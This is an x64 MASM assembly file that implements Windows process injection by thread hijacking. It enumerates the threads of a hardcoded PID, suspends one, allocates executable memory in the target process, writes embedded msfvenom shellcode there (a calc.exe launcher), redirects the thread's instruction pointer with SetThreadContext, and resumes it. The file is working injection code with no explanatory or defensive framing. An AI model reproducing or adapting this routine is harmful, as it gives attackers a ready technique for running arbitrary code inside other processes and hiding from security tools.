; windows_injection_setthreadcontext.asm

extrn ExitProcess :PROC
extrn OpenProcess :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn CreateToolhelp32Snapshot :PROC
extrn Thread32First :PROC
extrn Thread32Next :PROC
extrn OpenThread :PROC
extrn SuspendThread :PROC
extrn ResumeThread :PROC
extrn GetThreadContext :PROC
extrn SetThreadContext :PROC

_THREADENTRY32 STRUCT
    dwSize              DD ?
    cntUsage            DD ?
    th32ThreadID        DD ?
    th32OwnerProcessID  DD ?
    tpBasePri           DD ?
    tpDeltaPri          DD ?
    dwFlags             DD ?
_THREADENTRY32 ENDS

_CONTEXT STRUCT 16
    P1Home              DQ ?
    P2Home              DQ ?
    P3Home              DQ ?
    P4Home              DQ ?
    P5Home              DQ ?
    P6Home              DQ ?
    ContextFlags        DD ?
    MxCsr               DD ?
    SegCs               DW ?
    SegDs               DW ?
    SegEs               DW ?
    SegFs               DW ?
    SegGs               DW ?
    SegSs               DW ?
    EFlags              DD ?
    _Dr0                DQ ?
    _Dr1                DQ ?
    _Dr2                DQ ?
    _Dr3                DQ ?
    _Dr6                DQ ?
    _Dr7                DQ ?
    _Rax                DQ ?
    _Rcx                DQ ?
    _Rdx                DQ ?
    _Rbx                DQ ?
    _Rsp                DQ ?
    _Rbp                DQ ?
    _Rsi                DQ ?
    _Rdi                DQ ?
    _R8                 DQ ?
    _R9                 DQ ?
    _R10                DQ ?
    _R11                DQ ?
    _R12                DQ ?
    _R13                DQ ?
    _R14                DQ ?
    _R15                DQ ?
    _Rip                DQ ?
    FltsSave            DB 200h DUP (?)
    Header              DB 20h DUP (?)
    Legacy              DB 80h DUP (?)
    _Xmm0               DB 10h DUP (?)
    _Xmm1               DB 10h DUP (?)
    _Xmm2               DB 10h DUP (?)
    _Xmm3               DB 10h DUP (?)
    _Xmm4               DB 10h DUP (?)
    _Xmm5               DB 10h DUP (?)
    _Xmm6               DB 10h DUP (?)
    _Xmm7               DB 10h DUP (?)
    _Xmm8               DB 10h DUP (?)
    _Xmm9               DB 10h DUP (?)
    _Xmm10              DB 10h DUP (?)
    _Xmm11              DB 10h DUP (?)
    _Xmm12              DB 10h DUP (?)
    _Xmm13              DB 10h DUP (?)
    _Xmm14              DB 10h DUP (?)
    _Xmm15              DB 10h DUP (?)
    VectorRegister      DB 260h DUP (?)
    VectorControl       DQ ?
    DebugControl        DQ ?
    LastBranchToRip     DQ ?
    LastBranchFromRip   DQ ?
    LastExceptionToRip  DQ ?
    LastExceptionFromRip DQ ?
_CONTEXT ENDS

.data
    ; msfvenom -p windows/x64/exec cmd=calc.exe -f masm.
    
    shellcode   DB 0fch,48h,83h,0e4h,0f0h,0e8h,0c0h,00h
                DB 00h,00h,41h,51h,41h,50h,52h,51h
                DB 56h,48h,31h,0d2h,65h,48h,8bh,52h
                DB 60h,48h,8bh,52h,18h,48h,8bh,52h
                DB 20h,48h,8bh,72h,50h,48h,0fh,0b7h
                DB 4ah,4ah,4dh,31h,0c9h,48h,31h,0c0h
                DB 0ach,3ch,61h,7ch,02h,2ch,20h,41h
                DB 0c1h,0c9h,0dh,41h,01h,0c1h,0e2h,0edh
                DB 52h,41h,51h,48h,8bh,52h,20h,8bh
                DB 42h,3ch,48h,01h,0d0h,8bh,80h,88h
                DB 00h,00h,00h,48h,85h,0c0h,74h,67h
                DB 48h,01h,0d0h,50h,8bh,48h,18h,44h
                DB 8bh,40h,20h,49h,01h,0d0h,0e3h,56h
                DB 48h,0ffh,0c9h,41h,8bh,34h,88h,48h
                DB 01h,0d6h,4dh,31h,0c9h,48h,31h,0c0h
                DB 0ach,41h,0c1h,0c9h,0dh,41h,01h,0c1h
                DB 38h,0e0h,75h,0f1h,4ch,03h,4ch,24h
                DB 08h,45h,39h,0d1h,75h,0d8h,58h,44h
                DB 8bh,40h,24h,49h,01h,0d0h,66h,41h
                DB 8bh,0ch,48h,44h,8bh,40h,1ch,49h
                DB 01h,0d0h,41h,8bh,04h,88h,48h,01h
                DB 0d0h,41h,58h,41h,58h,5eh,59h,5ah
                DB 41h,58h,41h,59h,41h,5ah,48h,83h
                DB 0ech,20h,41h,52h,0ffh,0e0h,58h,41h
                DB 59h,5ah,48h,8bh,12h,0e9h,57h,0ffh
                DB 0ffh,0ffh,5dh,48h,0bah,01h,00h,00h
                DB 00h,00h,00h,00h,00h,48h,8dh,8dh
                DB 01h,01h,00h,00h,41h,0bah,31h,8bh
                DB 6fh,87h,0ffh,0d5h,0bbh,0f0h,0b5h,0a2h
                DB 56h,41h,0bah,0a6h,95h,0bdh,9dh,0ffh
                DB 0d5h,48h,83h,0c4h,28h,3ch,06h,7ch
                DB 0ah,80h,0fbh,0e0h,75h,05h,0bbh,47h
                DB 13h,72h,6fh,6ah,00h,59h,41h,89h
                DB 0dah,0ffh,0d5h,63h,61h,6ch,63h,2eh
                DB 65h,78h,65h,00h

    PID                 DQ 9396

    ALIGN               16
    ct                  _CONTEXT <>
    te32                _THREADENTRY32 <>
    te32size            DD SIZEOF te32
    hProcess            DQ ?
    hThread             DQ ?
    baseAddr            DQ ?
    hSnapshot           DQ ?
    TID                 DD ?

.code

Start PROC
    SUB     rsp, 28h

    ; Snapshot of process to get threads
    MOV     rcx, 4
    MOV     rdx, PID
    CALL    CreateToolhelp32Snapshot
    MOV     hSnapshot, rax

    ; get the first thread in the snapshot
    MOV     rcx, hSnapshot
    LEA     rdx, te32
    MOV     eax, te32size
    MOV     te32.dwSize, eax
    CALL    Thread32First

    ; Compare the PID owner of the thread with the PID of the process to inject
_loop_to_find_thread:
    MOV     rbx, PID   
    CMP     te32.th32OwnerProcessID, ebx
    JZ      _thread_found
    MOV     rcx, hSnapshot
    LEA     rdx, te32
    MOV     eax, te32size
    MOV     te32.dwSize, eax
    CALL    Thread32Next
    JMP     _loop_to_find_thread

_thread_found:
    MOV     eax, te32.th32ThreadID
    MOV     TID, eax

    ; OpenThread()
    MOV     rcx, 1Ah
    XOR     rdx, rdx
    MOV     eax, TID
    MOV     r8, rax
    CALL    OpenThread
    CMP     rax, 0
    JZ      _exit
    MOV     hThread, rax

    ; SuspendThread()
    MOV     rcx, hThread
    CALL    SuspendThread

    ; GetThreadContext()
    MOV     rcx, hThread
    MOV     ct.ContextFlags, 10001Fh
    LEA     rdx, ct
    CALL    GetThreadContext

    ; OpenProcess()
    MOV     rcx, 1F0FFFh
    XOR     rdx, rdx
    MOV     r8, PID
    CALL    OpenProcess
    CMP     rax, 0
    JZ      _exit
    MOV     hProcess, rax
    
    ; VirtualAllocEx()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, SIZEOF shellcode
    MOV     r9, 3000h
    MOV     qword ptr [rsp+32], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit
    MOV     baseAddr, rax

    ; WriteProcessMemory()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, shellcode
    MOV     r9, SIZEOF shellcode
    XOR     rax, rax
    MOV     qword ptr [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

    ; SetThreadContext() - update RIP 
    MOV     rcx, hThread
    MOV     rax, baseAddr
    MOV     ct._Rip, rax
    LEA     rdx, ct
    CALL    SetThreadContext

    ; ResumeThread()
    MOV     rcx, hThread
    CALL    ResumeThread

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess
Start ENDP
END